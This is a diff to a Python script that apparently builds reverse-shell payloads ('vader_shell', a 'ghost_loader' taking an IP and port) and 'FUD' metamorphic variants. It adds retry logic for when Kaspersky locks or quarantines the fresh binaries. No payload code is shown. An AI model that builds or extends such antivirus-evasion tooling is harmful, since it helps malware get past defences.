@@ -367,9 +367,21 @@ class CallbackListener:
 # ── build helpers ─────────────────────────────────────────────────────────────
 
 def run_silent(cmd, **kw):
+    kw.setdefault("cwd", ROOT)
     return subprocess.run(cmd, capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
-                          cwd=ROOT, **kw)
+                          **kw)
+
+def safe_copy(src, dst):
+    """Copy with retry — KAV may hold a lock on freshly-compiled binaries."""
+    for attempt in range(8):
+        try:
+            shutil.copy2(src, dst)
+            return True
+        except PermissionError:
+            time.sleep(2.5)
+    return False
+
 
 def build_baseline():
     info("Building baseline (vader_shell standard)...")
@@ -378,9 +390,11 @@ def build_baseline():
     if not os.path.exists(src):
         fail("vader_shell.exe not produced"); return None
     dst = os.path.join(TEST_DIR, "t_baseline.exe")
-    shutil.copy2(src, dst)
+    if not safe_copy(src, dst):
+        warn("vader_shell.exe locked by AV — already quarantined, skipping baseline"); return None
     ok(f"Baseline -> {os.path.basename(dst)}")
     return dst
+
 
 def build_fud():
     info("Building FUD (metamorph + mutate + compile)...")
@@ -391,7 +405,8 @@ def build_fud():
     if not os.path.exists(src):
         fail("FUD build failed"); return None
     dst = os.path.join(TEST_DIR, "t_fud.exe")
-    shutil.copy2(src, dst)
+    if not safe_copy(src, dst):
+        warn("vader_shell.exe locked by AV — skipping FUD variant"); return None
     ok(f"FUD -> {os.path.basename(dst)}")
     return dst
 
@@ -407,7 +422,8 @@ def build_ghost_loader(ip, port, v3=False):
         fail(f"ghost_loader.exe ({ver}) not produced"); return None
     label = "t_ghost_loader_v3.exe" if v3 else "t_ghost_loader.exe"
     dst = os.path.join(TEST_DIR, label)
-    shutil.copy2(src, dst)
+    if not safe_copy(src, dst):
+        warn("ghost_loader.exe locked by AV — skipping"); return None
     ok(f"Ghost Loader {ver} -> {os.path.basename(dst)}")
     return dst
 
